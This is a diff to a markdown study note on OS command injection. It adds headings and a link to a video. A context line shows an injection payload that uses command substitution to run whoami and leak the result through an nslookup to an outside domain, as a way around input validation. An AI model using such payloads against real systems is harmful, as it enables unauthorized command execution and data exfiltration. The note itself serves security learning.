@@ -20,6 +20,9 @@ In this attack, the attacker-supplied operating system commands are usually exec
 > [!important] Command Injection appearance
 > This vulnerability usually only appears if you have a need for running commands on the OS
 
+---
+## Substitution command
+
 > [!important] Substitution command
 > Earlier example with `;` usually can get stuck when input is validated
 > Use Substitution command trick in Linux:
@@ -51,3 +54,8 @@ echo MY NAME IS 'FIRSTNAME '$(nslookup $(whoami).google.com)' LASTNAME'
 ```
 
 Therefore you would find the current user
+
+---
+## Related links
+
+Check out this [video](https://www.youtube.com/watch?v=Uk4imneVI30) by mdisec to learn more about OS Command Injection
